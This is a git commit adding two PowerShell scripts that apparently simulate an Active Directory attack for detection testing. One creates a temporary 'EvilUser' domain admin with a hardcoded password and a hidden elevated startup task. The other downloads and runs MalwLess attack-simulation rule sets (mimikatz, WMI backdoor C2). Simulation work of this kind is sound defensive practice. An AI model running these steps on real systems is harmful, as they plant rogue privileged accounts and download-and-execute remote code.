5258b7e1aa5c2d6f4190c5f0c9fe076090b72d90
NataS <marcos.schejtman@gmail.com>
2024-03-04 22:13:08 -0600

    Initial version

---
+++ ADSimulAttack/follow.ps1
@@ -0,0 +1,28 @@
+﻿$downloadUrl = "https://github.com/n0dec/MalwLess/releases/download/latest/malwless.zip"
+$outputPath = "C:\demo\malwless.zip"
+$extra1 = "https://github.com/n0dec/MalwLess/raw/master/sets/APTSimulator/mimikatz.json"
+$extra2 = "https://github.com/n0dec/MalwLess/raw/master/sets/APTSimulator/active-guest-acccount-admin.json"
+$extra3 = "https://github.com/n0dec/MalwLess/raw/master/sets/APTSimulator/js-dropper.json"
+$extra4 = "https://github.com/n0dec/MalwLess/raw/master/sets/APTSimulator/wmi-backdoor-c2.json"
+Invoke-WebRequest -Uri $downloadUrl -OutFile $outputPath
+
+$extractPath = "C:\demo\Malware"
+Expand-Archive -Path $outputPath -DestinationPath $extractPath
+Set-Location -Path $extractPath
+
+Invoke-WebRequest -Uri $extra1 -OutFile $extractPath\1.json
+Invoke-WebRequest -Uri $extra2 -OutFile $extractPath\2.json
+Invoke-WebRequest -Uri $extra3 -OutFile $extractPath\3.json
+Invoke-WebRequest -Uri $extra4 -OutFile $extractPath\4.json
+
+$malwLessExecutable = Join-Path -Path $extractPath -ChildPath "MalwLess.exe"
+1..4 | ForEach-Object {
+    $jsonFilePath = Join-Path -Path $extractPath -ChildPath "$_.json"
+    $arguments = "-r `"$jsonFilePath`""
+    Start-Process -FilePath $malwLessExecutable -ArgumentList $arguments -NoNewWindow -Wait
+}
+
+Set-Location -Path "C:\"
+
+Remove-Item -Path $outputPath -Force
+Remove-Item -Path $extractPath -Recurse -Force
---
+++ ADSimulAttack/initial.ps1
@@ -0,0 +1,26 @@
+﻿Import-Module ActiveDirectory
+
+$userName = "EvilUser" + (Get-Random -Minimum 100 -Maximum 999)
+$password = "Password123!" | ConvertTo-SecureString -AsPlainText -Force
+New-ADUser -Name $userName -AccountPassword $password -Enabled $true -PasswordNeverExpires $true -ChangePasswordAtLogon $false -CannotChangePassword $true
+
+$domainAdminGroup = "Domain Admins"
+Add-ADGroupMember -Identity $domainAdminGroup -Members $userName
+
+$scriptPath = "C:\demo\follow.ps1"
+
+$action = New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -File `"$scriptPath`""
+$trigger = New-ScheduledTaskTrigger -AtStartup
+$settings = New-ScheduledTaskSettingsSet -MultipleInstances IgnoreNew -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -StartWhenAvailable
+$principal = New-ScheduledTaskPrincipal -UserId "$userName" -LogonType S4U -RunLevel Highest
+
+$taskName = "RunMalwLessAsNewUser"
+Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Description "Run MalwLess as new user" -User $userName -Password "Password123!"
+
+Start-ScheduledTask -TaskName $taskName
+
+Start-Sleep -Seconds 30
+
+Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
+
+Remove-ADUser -Identity $userName -Confirm:$false 
